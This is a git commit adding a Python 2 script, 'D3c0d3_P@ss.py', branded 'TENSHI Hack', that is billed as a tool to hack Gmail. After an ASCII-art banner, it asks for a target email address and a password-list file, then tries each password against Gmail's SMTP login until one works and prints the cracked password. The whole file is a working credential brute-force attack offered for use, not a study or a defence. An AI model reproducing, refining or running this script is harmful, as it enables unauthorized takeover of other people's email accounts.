a39e1801df2afb6881f8b516a8ef54dc7370ebf3
garciarodrigue <48865498+garciarodrigue@users.noreply.github.com>
2020-02-19 15:52:15 -0600

    Add files via upload

---
+++ D3c0d3_P@ss.py
@@ -0,0 +1,76 @@
+#!/usr/bin/python
+'''creado x TENSHI'''
+
+import smtplib
+from os import system
+
+def main():
+   print '0101010101010101010101010101010101010101010101'
+   print '               TENSHI Hack                  '
+   print '0101010101010101010101010101010101010101010101'
+   print '               +Cr3@D0 X TENSHI+              '
+   print '\n                                               '
+   print '                                              '
+   print '                                                 '
+   print '                                                 '
+   print '           TENSHI                                '
+   print '       _,.                   '
+   print '     ,` -.)                  '
+   print '    ( _/-\\-._               '
+   print '   /,|`--._,-^|            , '
+   print '   \_| |`-._/||          , | '
+   print '     |  `-, / |         /  / '
+   print '     |     || |        /  /  '
+   print '      `r-._||/   __   /  /   '
+   print '  __,-<_     )`-/  `./  /    '
+   print '  \   `---    \   / /  /     '
+   print '     |           |./  /      '
+   print '     /           //  /       '
+   print ' \_/  \         |/  /        '
+   print '  |    |   _,^- /  /         '
+   print '  |    , ``  (\/  /_         '
+   print '   \,.->._    \X-=/^         '
+   print '   (  /   `-._//^`           '
+   print '    `Y-.____(__}             '
+   print '     |     {__)              ' 
+   print '           ()   V.1.0        '
+
+main()
+print 'Para hackear Gmail'
+print '                  '
+print '[1] EmpeZar AtaKe'
+print '[2] SaLir'
+option = input('==>')
+if option == 1:
+   file_path = raw_input('Archivo TXT de Pass..:')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('target email :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print '[+] this account has been hacked, password :' + password + '     ^_^'
+
+            break
+         else:
+            print '[!] password not found => ' + password
+login()
